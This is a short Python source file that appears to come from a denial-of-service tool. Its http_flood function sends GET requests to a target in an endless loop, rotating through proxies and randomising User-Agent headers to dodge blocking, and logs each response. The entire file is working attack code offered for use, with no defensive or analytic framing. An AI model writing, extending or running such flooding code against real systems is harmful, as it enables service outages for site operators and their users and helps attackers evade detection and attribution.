import requests
import random
from core.proxy_manager import ProxyManager
from config import Config

def http_flood(target, num_threads, proxy_manager):
    config = Config()
    user_agents = config.user_agents
    while True:
        proxy = proxy_manager.get_proxy()
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(target, headers=headers, proxies={'http': proxy, 'https': proxy}, timeout=5)
            print(f"HTTP Flood: {target} | Status Code: {response.status_code} | Proxy: {proxy}")
        except Exception as e:
            print(f"HTTP Flood Error: {e} | Proxy: {proxy}")
